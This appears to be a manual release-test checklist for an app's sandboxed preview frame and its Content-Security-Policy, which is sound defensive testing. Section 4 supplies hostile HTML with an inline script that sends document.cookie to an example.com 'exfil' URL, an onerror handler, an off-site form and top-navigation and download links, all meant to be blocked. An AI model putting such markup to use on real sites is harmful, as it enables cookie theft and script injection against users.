# Renderer sandbox e2e

Real-browser verification of the presentation sandbox and the document
security policy. **This is the only place any of it is actually observed being
enforced**: vitest runs against happy-dom and Go tests run against no browser at
all, so the automated suites prove that Tangent hands the browser a policy that
denies these things, not that a browser denied them.

Run this before any release that touches `internal/server/csp.go`,
`ui/src/lib/sandbox-frame.ts`, or `ui/src/lib/sandbox-frame-shim.ts`.

See [`../renderer-trust-classes.md`](../renderer-trust-classes.md) for what each
check is proving.

## 1. Boot a production build

```bash
mise --no-config exec node@22.12.0 -- make build
./tangent
```

Use `make build`, not `make dev`. The dev proxy deliberately relaxes
`script-src` to `'unsafe-inline'` for Vite's preamble, so the parent-policy
half of these checks does not apply there.

## 2. Confirm the document policy is served

```bash
curl -sI http://127.0.0.1:7842/ | grep -iE 'content-security-policy|permissions-policy|x-frame-options|cross-origin'
```

Confirm:

- `script-src` names `'self'` and one `'sha256-…'` source, and does **not**
  contain `'unsafe-inline'` or `'unsafe-eval'`.
- `connect-src` names `'self'` plus this origin's own WebSocket schemes
  (`ws://` and `wss://` at the host you connected to — the policy is built
  per-request from the `Host` header, so it names your port, not a fixed one)
  and nothing else — **no external origin at all**, which is what makes
  `network.fetch` enforced.
- `img-src` and `font-src` name `https://cdn.tldraw.com`, and nothing else
  external. That is the whiteboard's asset CDN, admitted as a passive
  subresource only; seeing it in `connect-src` would be a regression.
- `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`,
  `form-action 'self'`.
- `Permissions-Policy` contains `clipboard-write=(self)` and `camera=()`.
- No `default-src` and no `frame-src` — both are omitted deliberately.

## 3. Confirm the SPA still works under the policy

Open `http://127.0.0.1:7842/`, open the browser console, and confirm there are
**no CSP violation reports**. Then exercise one room workflow end to end (a
`tangent.triage` push is enough) and confirm the WebSocket connects — that is
the `connect-src` websocket clause working.

A `Refused to connect to 'ws://…'` message here means the `connect-src` clause
is wrong for this Host header; that is the failure mode to watch for.

Then open a **whiteboard** envelope, which is the workflow most likely to trip
the policy: tldraw loads fonts, icons, and its watermark from
`https://cdn.tldraw.com`, which the policy admits as passive subresources only.
Confirm the toolbar icons and the text tool's typography render. A refusal for
`https://cdn.tldraw.com/…/translations/…` is **expected and correct** when the
browser is not in English — it is a scripted fetch to an external origin, which
is the `network.fetch` the whiteboard manifest does not declare — and tldraw
falls back to its bundled English strings.

## 4. Drive a design iteration with hostile markup

Ask an agent to call `tangent.design-iteration` with HTML that tries all five
things, e.g.:

```html
<section>
  <script>
    window.parent.postMessage({ type: "tangent:design-iteration", action_id: "x", action_kind: "click-region" }, "*");
    fetch("https://example.com/exfil?d=" + document.cookie);
  </script>
  <img src="x" onerror="alert('inline handler ran')">
  <form action="https://example.com/post" method="post"><button>submit</button></form>
  <a href="https://example.com/nav" target="_top">navigate</a>
  <a href="data:text/plain,hello" download="x.txt">download</a>
  <button id="hero">Hero button</button>
</section>
```

with a `click-region` prompt whose selector is `#hero`.

In the browser, with the console open, confirm:

1. **Script execution blocked.** The console shows CSP violations for the inline
   `<script>` and the `onerror` handler. No alert appears, and — importantly —
   **no envelope is submitted**: the forged `postMessage` never ran, and even if
   it had, it carries no nonce.
2. **Network blocked.** The `fetch` is refused by `connect-src 'none'`; the
   Network panel shows no request to `example.com`.
3. **Forms blocked.** Clicking the form's submit button navigates nowhere and
   logs a sandbox or `form-action` refusal.
4. **Navigation blocked.** Clicking the `target="_top"` link logs a sandbox
   top-navigation refusal and the Tangent page does not move.
5. **Downloads blocked.** Clicking the `download` link produces no file and logs
   a downloads-sandbox refusal.
6. **The region still works.** Clicking `Hero button` submits the iteration.

## 5. Keyboard and screen reader

With the same envelope:

1. Tab into the preview frame. The `#hero` region takes focus and shows a
   visible focus ring.
2. Press **Enter**. The iteration submits.
3. Repeat with **Space**.
4. Turn on VoiceOver (macOS: ⌘F5) and navigate into the frame. The region is
   announced as a **button** with the prompt's label, not as plain text.
5. Confirm the line above the frame reads "The preview contains 1 selectable
   region…".

Any of 1–4 failing means the shim did not run — check step 2's `script-src`
hash against `ui/src/lib/sandbox-frame.ts`, since a hash mismatch disables the
shim silently and leaves the preview inert but visible.

## 6. Payload ceiling

Ask the agent to send a variant larger than the sandbox payload ceiling in
`ui/src/lib/sandbox-frame.ts` (read the constant there rather than trusting a
number here). Confirm the frame is not rendered and a red `role="alert"` line
reads `Not submitted: this preview is … KB and the limit for sandboxed content
is … KB. Ask the agent to send a smaller variant.`

## 7. Unclassified renderer

There is no supported way to reach this from an agent — an unregistered kind is
refused server-side — so verify it in the browser console instead:

```js
// In the SPA's console, before an envelope arrives.
// A kind with no manifest binding must refuse rather than render.
```

Alternatively trust the automated coverage
(`ui/src/components/envelopes/EnvelopeRouter.trust.test.tsx`), which drives the
real router through the real registry; this step is optional.
